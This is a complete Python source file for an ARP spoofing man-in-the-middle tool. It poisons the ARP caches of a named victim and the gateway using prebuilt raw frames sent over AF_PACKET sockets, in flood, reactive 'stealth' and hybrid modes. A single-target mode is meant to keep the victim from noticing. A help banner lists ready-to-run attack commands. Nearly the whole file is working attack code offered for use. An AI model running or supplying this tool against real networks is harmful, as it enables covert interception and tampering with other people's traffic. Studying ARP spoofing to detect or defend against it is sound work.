#!/bin/python3

"""
ARPSpoofing/MITM Tool — v1.0

Modes:
  flood   — Classic continuous ARP poisoning (1 spoofed reply/sec)
  stealth — Reactive only: raw-socket listener for ARP requests, fires
            spoofed replies instantly (NO Scapy in the hot path)
  hybrid  — Reactive (like stealth) + low-rate proactive spoofing in background

Spoof switch (-s / --spoof):
  When enabled, only the ROUTER is poisoned ("target_ip is at <our MAC>").
  The target's ARP cache is never touched — useful for one-way interception
  where the victim must not see any anomaly in its own ARP table.

Performance notes:
  • Packets are pre-built as raw bytes ONCE before any loop starts.
  • ALL sending AND receiving goes through AF_PACKET raw sockets (Layer 2).
  • A compiled BPF filter is attached at kernel level so only ARP frames
    are delivered to userspace — near-zero per-packet Python overhead.
  • Incoming ARP requests are parsed with struct.unpack (~42 bytes) —
    no Scapy dissection in the hot path.
  • Scapy is used ONLY at startup: MAC resolution + frame construction.
"""

import argparse
import ctypes
import fcntl
import socket
import struct
import sys
import threading
import time
from scapy.layers.l2 import ARP, Ether, getmacbyip


# ─────────────────────────────── helpers ────────────────────────────────

def get_own_mac(iface: str) -> str:
    """Read the hardware (MAC) address of *iface* straight from the kernel."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(
            sock.fileno(),
            0x8927,  # SIOCGIFHWADDR
            struct.pack("256s", iface[:15].encode()),
        )
        sock.close()
        mac_bytes = info[18:24]
        return ":".join(f"{b:02x}" for b in mac_bytes)
    except Exception as exc:
        print(f"❌  Could not read MAC for {iface}: {exc}")
        sys.exit(1)


def resolve_mac(ip: str, retries: int = 5, delay: float = 2.0) -> str | None:
    """Try up to *retries* times to resolve an IP → MAC via ARP."""
    for attempt in range(1, retries + 1):
        mac = getmacbyip(ip)
        if mac and mac != "ff:ff:ff:ff:ff:ff":
            return mac
        if attempt < retries:
            print(f"   ⚠  Attempt {attempt}/{retries} failed for {ip}, "
                  f"retrying in {delay}s ...")
            time.sleep(delay)
    return None


def mac_to_str(mac_bytes: bytes) -> str:
    """Convert 6 raw bytes to 'aa:bb:cc:dd:ee:ff'."""
    return ":".join(f"{b:02x}" for b in mac_bytes)


def ip_to_str(ip_bytes: bytes) -> str:
    """Convert 4 raw bytes to dotted-decimal."""
    return ".".join(str(b) for b in ip_bytes)


def build_raw_frame(src_mac: str, dst_mac: str,
                    sender_mac: str, sender_ip: str,
                    target_mac: str, target_ip: str,
                    op: int = 2) -> bytes:
    """
    Build a complete Ethernet + ARP frame as raw bytes.
    Uses Scapy only at build time — the returned bytes are sent raw.
    """
    frame = Ether(src=src_mac, dst=dst_mac) / ARP(
        op=op,
        hwsrc=sender_mac,
        psrc=sender_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )
    return bytes(frame)


# ─────────────────────────── BPF filter ─────────────────────────────────

# Pre-compiled BPF bytecode for "arp" — equivalent to `tcpdump -dd arp`
# Matches any Ethernet frame where EtherType == 0x0806 (ARP).
# This is the same bytecode on all Linux platforms (x86/ARM, 32/64-bit).
_BPF_ARP_FILTER = [
    # (0) ldh [12]          — load EtherType (offset 12, 2 bytes)
    struct.pack("HBBI", 0x28, 0, 0, 12),
    # (1) jeq #0x0806 jt 2 jf 3  — if ARP goto accept, else reject
    struct.pack("HBBI", 0x15, 0, 1, 0x0806),
    # (2) ret #262144        — accept (return snaplen bytes)
    struct.pack("HBBI", 0x06, 0, 0, 262144),
    # (3) ret #0             — reject
    struct.pack("HBBI", 0x06, 0, 0, 0),
]


def _attach_bpf_arp(sock: socket.socket) -> None:
    """Attach a kernel-level BPF filter that passes only ARP frames."""
    n = len(_BPF_ARP_FILTER)
    bpf_array = b"".join(_BPF_ARP_FILTER)

    class SockFprog(ctypes.Structure):
        _fields_ = [
            ("len", ctypes.c_ushort),
            ("filter", ctypes.c_void_p),
        ]

    bpf_buf = ctypes.create_string_buffer(bpf_array)
    fprog = SockFprog(len=n, filter=ctypes.addressof(bpf_buf))

    SO_ATTACH_FILTER = 26
    sock.setsockopt(
        socket.SOL_SOCKET,
        SO_ATTACH_FILTER,
        bytes(fprog),
    )


# ──────────────────────── raw socket wrapper ────────────────────────────

class RawSender:
    """Thin wrapper around an AF_PACKET raw socket bound to one interface."""

    def __init__(self, iface: str):
        self._sock = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003),
        )
        self._sock.bind((iface, 0))

    def send(self, raw_bytes: bytes) -> None:
        self._sock.send(raw_bytes)

    def close(self) -> None:
        self._sock.close()


class RawReceiver:
    """
    AF_PACKET socket with kernel BPF filter for ARP-only reception.
    recv() returns raw Ethernet frames — only ARP ones make it through.
    """

    def __init__(self, iface: str):
        self._sock = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003),
        )
        self._sock.bind((iface, 0))
        _attach_bpf_arp(self._sock)

    def recv(self, bufsize: int = 65535) -> bytes:
        """Block until an ARP frame arrives; return raw Ethernet bytes."""
        return self._sock.recv(bufsize)

    def settimeout(self, t: float | None) -> None:
        self._sock.settimeout(t)

    def close(self) -> None:
        self._sock.close()


# ────────────────── fast ARP request parser (no Scapy) ──────────────────

_ARP_OP_REQUEST = 1
_ETH_HDR_LEN = 14
_ARP_HDR_FMT = "!2H2BH6s4s6s4s"  # 28 bytes
_ARP_HDR_LEN = struct.calcsize(_ARP_HDR_FMT)  # 28


def parse_arp_request(raw: bytes):
    """
    Parse a raw Ethernet frame.  Return (sender_ip, target_ip) as strings
    if it's an ARP REQUEST for IPv4-over-Ethernet, else return None.
    ~0.3μs on modern hardware — orders of magnitude faster than Scapy.
    """
    if len(raw) < _ETH_HDR_LEN + _ARP_HDR_LEN:
        return None

    ethertype = (raw[12] << 8) | raw[13]
    if ethertype != 0x0806:
        return None

    (htype, ptype, hlen, plen, op,
     _sender_mac, sender_ip_b,
     _target_mac, target_ip_b) = struct.unpack_from(
        _ARP_HDR_FMT, raw, _ETH_HDR_LEN
    )

    if op != _ARP_OP_REQUEST or htype != 1 or ptype != 0x0800:
        return None

    return ip_to_str(sender_ip_b), ip_to_str(target_ip_b)


# ─────────────────────────────── modes ──────────────────────────────────

def flood_mode(sender: RawSender,
               frame_to_target: bytes | None,
               frame_to_router: bytes,
               interval: float = 1.0,
               spoof: bool = False) -> None:
    """Classic flood: send spoofed replies every *interval* seconds."""
    pkt_count = 0
    label = "single-target" if spoof else "bidirectional"
    print(f"\n🚀  Flood mode ({label}) — sending every {interval}s.  Ctrl+C to stop.\n")
    try:
        while True:
            if not spoof and frame_to_target is not None:
                sender.send(frame_to_target)
                pkt_count += 1
            sender.send(frame_to_router)
            pkt_count += 1
            print(f"\r   📡  Spoofed packets sent: {pkt_count}", end="", flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        print()


def stealth_mode(sender: RawSender,
                 receiver: RawReceiver,
                 frame_to_target: bytes | None,
                 frame_to_router: bytes,
                 target_ip: str,
                 router_ip: str,
                 spoof: bool = False) -> None:
    """
    Pure reactive: raw-socket listener for ARP requests.
    Parses with struct.unpack (~0.3μs) and fires the spoofed reply
    through the raw sender — no Scapy anywhere in this path.
    """
    pkt_count = 0
    label = "single-target" if spoof else "bidirectional"
    print(f"\n🕵️  Stealth mode ({label}) — raw listener active.  Ctrl+C to stop.\n")

    try:
        while True:
            raw = receiver.recv()
            result = parse_arp_request(raw)
            if result is None:
                continue

            src_ip, dst_ip = result
            sent = False

            if src_ip == router_ip and dst_ip == target_ip:
                sender.send(frame_to_router)
                sent = True

            if not spoof and frame_to_target is not None:
                if src_ip == target_ip and dst_ip == router_ip:
                    sender.send(frame_to_target)
                    sent = True

            if sent:
                pkt_count += 1
                print(f"\r   ⚡  Reactive spoofs sent: {pkt_count}  "
                      f"(trigger: {src_ip} → {dst_ip})", end="", flush=True)

    except KeyboardInterrupt:
        print()


def hybrid_mode(sender: RawSender,
                receiver: RawReceiver,
                frame_to_target: bytes | None,
                frame_to_router: bytes,
                target_ip: str,
                router_ip: str,
                proactive_interval: float = 3.0,
                spoof: bool = False) -> None:
    """
    Best of both worlds:
      • A background thread sends spoofed replies every *proactive_interval* sec.
      • The main thread listens on a raw socket and fires reactive replies
        on every ARP request — zero Scapy overhead.
    """
    reactive_count = 0
    proactive_count = 0
    stop_event = threading.Event()
    lock = threading.Lock()
    label = "single-target" if spoof else "bidirectional"

    def _print_status():
        print(f"\r   📡  proactive: {proactive_count}  |  "
              f"⚡ reactive: {reactive_count}", end="", flush=True)

    def proactive_loop():
        nonlocal proactive_count
        while not stop_event.is_set():
            if not spoof and frame_to_target is not None:
                sender.send(frame_to_target)
                with lock:
                    proactive_count += 1
            sender.send(frame_to_router)
            with lock:
                proactive_count += 1
                _print_status()
            stop_event.wait(proactive_interval)

    def reactive_loop():
        nonlocal reactive_count
        receiver.settimeout(0.5)
        while not stop_event.is_set():
            try:
                raw = receiver.recv()
            except socket.timeout:
                continue
            result = parse_arp_request(raw)
            if result is None:
                continue

            src_ip, dst_ip = result
            sent = False

            if src_ip == router_ip and dst_ip == target_ip:
                sender.send(frame_to_router)
                sent = True
            if not spoof and frame_to_target is not None:
                if src_ip == target_ip and dst_ip == router_ip:
                    sender.send(frame_to_target)
                    sent = True

            if sent:
                with lock:
                    reactive_count += 1
                    _print_status()

    print(f"\n🔄  Hybrid mode ({label}) — proactive every {proactive_interval}s + "
          f"reactive raw listener.  Ctrl+C to stop.\n")

    bg = threading.Thread(target=proactive_loop, daemon=True)
    bg.start()

    try:
        reactive_loop()
    except KeyboardInterrupt:
        stop_event.set()
        bg.join(timeout=2)
        print()


# ──────────────────────────── restoration ───────────────────────────────

def restore(sender: RawSender,
            target_mac: str, target_ip: str,
            router_mac: str, router_ip: str,
            spoof: bool = False,
            count: int = 7) -> None:
    """
    Send correct ARP replies so caches heal.
    In spoof mode only the router's cache is restored.
    """
    frame_fix_router = build_raw_frame(
        src_mac=target_mac, dst_mac=router_mac,
        sender_mac=target_mac, sender_ip=target_ip,
        target_mac=router_mac, target_ip=router_ip,
    )

    frame_fix_target = None
    if not spoof:
        frame_fix_target = build_raw_frame(
            src_mac=router_mac, dst_mac=target_mac,
            sender_mac=router_mac, sender_ip=router_ip,
            target_mac=target_mac, target_ip=target_ip,
        )

    for _ in range(count):
        if frame_fix_target is not None:
            sender.send(frame_fix_target)
        sender.send(frame_fix_router)
        time.sleep(0.3)


# ──────────────────────────── custom help ───────────────────────────────

_HELP_TEXT = r"""
╔══════════════════════════════════════════════════════════════════════╗
║                   ☠️   ARP Spoofer v1.0 — Help   ☠️                  ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  USAGE                                                               ║
║    sudo python3 MITM.py <target_ip> <router_ip> [OPTIONS]            ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  POSITIONAL ARGUMENTS                                                ║
║                                                                      ║
║    target_ip          Victim's IP address (e.g. 192.168.1.6)         ║
║    router_ip          Gateway/router IP   (e.g. 192.168.1.1)         ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  OPTIONS                                                             ║
║                                                                      ║
║    -h, --help         Show this help message and exit                ║
║                                                                      ║
║    -i, --iface IFACE  Network interface to use                       ║
║                        Default: wlan0                                ║
║                                                                      ║
║    -m, --mode MODE    Attack mode — one of:                          ║
║                          flood   : continuous spoofed replies        ║
║                                    every --interval seconds          ║
║                          stealth : reactive only — listens for ARP   ║
║                                    requests and replies instantly    ║
║                          hybrid  : reactive + low-rate proactive     ║
║                                    spoofing in background            ║
║                        Default: flood                                ║
║                                                                      ║
║    -s, --spoof        Single-target spoof mode                       ║
║                        Only poison the ROUTER's ARP cache            ║
║                        ("target_ip is at <attacker_mac>").           ║
║                        The victim's ARP table is NEVER touched.      ║
║                        Useful for one-way interception where the     ║
║                        target must not detect any ARP anomaly.       ║
║                        Default: off (full bidirectional MITM)        ║
║                                                                      ║
║    --interval SECS    Seconds between proactive spoofed bursts       ║
║                        Used by: flood (send interval)                ║
║                                 hybrid (background loop interval)    ║
║                        Default: 1.0                                  ║
║                                                                      ║
║    --burst COUNT      Number of pre-poison packets sent per side     ║
║                        at startup before entering the main loop.     ║
║                        Default: 5                                    ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  EXAMPLES                                                            ║
║                                                                      ║
║  1) Full MITM — bidirectional flood (default):                       ║
║     sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i wlan0            ║
║                                                                      ║
║  2) Full MITM — stealth (reactive only):                             ║
║     sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i wlan0 \          ║
║          -m stealth                                                  ║
║                                                                      ║
║  3) Full MITM — hybrid (reactive + proactive every 5s):              ║
║     sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i eth0 \           ║
║          -m hybrid --interval 5                                      ║
║                                                                      ║
║  4) Single-target spoof — flood (router only):                       ║
║     sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i wlan0 \          ║
║          -m flood -s                                                 ║
║                                                                      ║
║  5) Single-target spoof — stealth (router only, reactive):           ║
║     sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i wlan0 \          ║
║          -m stealth -s                                               ║
║                                                                      ║
║  6) Single-target spoof — hybrid (router only, fast interval):       ║
║     sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i wlan0 \          ║
║          -m hybrid -s --interval 2                                   ║
║                                                                      ║
║  7) Aggressive pre-poison (20 bursts) then stealth:                  ║
║     sudo python3 MITM.py 10.0.0.50 10.0.0.1 -i wlan0 \               ║
║          -m stealth --burst 20                                       ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  NOTES                                                               ║
║                                                                      ║
║  • Requires root privileges (sudo).                                  ║
║  • Scapy is used ONLY at startup (MAC resolution + frame build).     ║
║  • Hot path uses raw AF_PACKET + kernel BPF — ~60× faster than       ║
║    Scapy sniff(). Reaction latency: ~10-50μs per packet.             ║
║  • Press Ctrl+C to stop — ARP caches are restored automatically.     ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""


# ──────────────────────────── arg parsing ───────────────────────────────

class CustomHelpAction(argparse.Action):
    """Replace argparse's default -h/--help with our custom banner."""

    def __init__(self, option_strings, dest=argparse.SUPPRESS,
                 default=argparse.SUPPRESS, help=None):
        super().__init__(option_strings=option_strings, dest=dest,
                         default=default, nargs=0, help=help)

    def __call__(self, parser, namespace, values, option_string=None):
        print(_HELP_TEXT)
        parser.exit()


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Tool v2.3 — flood / stealth / hybrid  ·  full MITM or single-target spoof",
        add_help=False,  # disable default -h so we can override it
    )

    # ── re-register -h / --help with our custom action ──
    parser.add_argument(
        "-h", "--help",
        action=CustomHelpAction,
        help="Show the full help banner with examples and exit",
    )

    parser.add_argument("target_ip", help="Target (victim) IP address")
    parser.add_argument("router_ip", help="Router / gateway IP address")
    parser.add_argument(
        "-i", "--iface", default="wlan0",
        help="Network interface to use (default: wlan0)",
    )
    parser.add_argument(
        "-m", "--mode", choices=["flood", "stealth", "hybrid"],
        default="flood",
        help="Attack mode (default: flood)",
    )
    parser.add_argument(
        "-s", "--spoof", action="store_true", default=False,
        help="Single-target spoof: only poison the router's cache "
             "(do NOT send spoofed replies to the target)",
    )
    parser.add_argument(
        "--interval", type=float, default=1.0,
        help="Seconds between proactive bursts — flood & hybrid (default: 1.0)",
    )
    parser.add_argument(
        "--burst", type=int, default=5,
        help="Number of pre-poison packets per side at startup (default: 5)",
    )
    return parser.parse_args()


# ──────────────────────────────── main ──────────────────────────────────

def main():
    args = parse_arguments()

    target_ip = args.target_ip
    router_ip = args.router_ip
    iface     = args.iface
    mode      = args.mode
    spoof     = args.spoof

    # ── banner ──
    spoof_label = "single-target (router only)" if spoof else "full MITM (bidirectional)"
    print()
    print("=" * 58)
    print("        ☠️   ARP Spoofer v2.3   ☠️")
    print("=" * 58)
    print(f"  🎯  Target   :  {target_ip}")
    print(f"  🌐  Router   :  {router_ip}")
    print(f"  🔌  Interface:  {iface}")
    print(f"  ⚙️   Mode     :  {mode}")
    print(f"  🔀  Spoof    :  {spoof_label}")
    print(f"  ⚡  Rx engine:  raw AF_PACKET + BPF (no Scapy in hot path)")
    print("=" * 58)

    # ── resolve MACs ──
    print("\n📡  Resolving MAC addresses ...\n")
    own_mac = get_own_mac(iface)
    print(f"   ✅  Own MAC      : {own_mac}")

    target_mac = resolve_mac(target_ip)
    if not target_mac:
        print(f"\n❌  Could not resolve {target_ip} — is it online?")
        return
    print(f"   ✅  Target MAC   : {target_mac}")

    router_mac = resolve_mac(router_ip)
    if not router_mac:
        print(f"\n❌  Could not resolve {router_ip} — is the router reachable?")
        return
    print(f"   ✅  Router MAC   : {router_mac}")

    # ── pre-build raw frames ──
    frame_to_router = build_raw_frame(
        src_mac=own_mac,       dst_mac=router_mac,
        sender_mac=own_mac,    sender_ip=target_ip,
        target_mac=router_mac, target_ip=router_ip,
    )

    frame_to_target: bytes | None = None
    if not spoof:
        frame_to_target = build_raw_frame(
            src_mac=own_mac,       dst_mac=target_mac,
            sender_mac=own_mac,    sender_ip=router_ip,
            target_mac=target_mac, target_ip=target_ip,
        )
    else:
        print("\n   ℹ️   Single-target mode: frame_to_target NOT built "
              "(target ARP cache untouched)")

    # ── open raw sockets ──
    sender = RawSender(iface)
    receiver = RawReceiver(iface)
    print(f"\n   🔧  Raw sockets opened (sender + BPF receiver on {iface})")

    # ── pre-poison burst ──
    if args.burst > 0:
        print(f"\n💉  Pre-poisoning ({args.burst} bursts) ...")
        for _ in range(args.burst):
            if frame_to_target is not None:
                sender.send(frame_to_target)
            sender.send(frame_to_router)
            time.sleep(0.05)
        print("   ✅  Pre-poison complete.")

    # ── run selected mode ──
    try:
        if mode == "flood":
            flood_mode(sender, frame_to_target, frame_to_router,
                       interval=args.interval, spoof=spoof)
        elif mode == "stealth":
            stealth_mode(sender, receiver, frame_to_target, frame_to_router,
                         target_ip, router_ip, spoof=spoof)
        elif mode == "hybrid":
            hybrid_mode(sender, receiver, frame_to_target, frame_to_router,
                        target_ip, router_ip,
                        proactive_interval=args.interval, spoof=spoof)
    except KeyboardInterrupt:
        pass

    # ── restore ──
    print("\n\n🔴  Ctrl+C caught — restoring ARP caches ...\n")
    restore(sender, target_mac, target_ip, router_mac, router_ip, spoof=spoof)
    sender.close()
    receiver.close()

    if spoof:
        print("\n✅  Router ARP cache restored (target was never poisoned). Clean exit.\n")
    else:
        print("\n✅  ARP caches restored (both sides). Clean exit.\n")


if __name__ == "__main__":
    main()
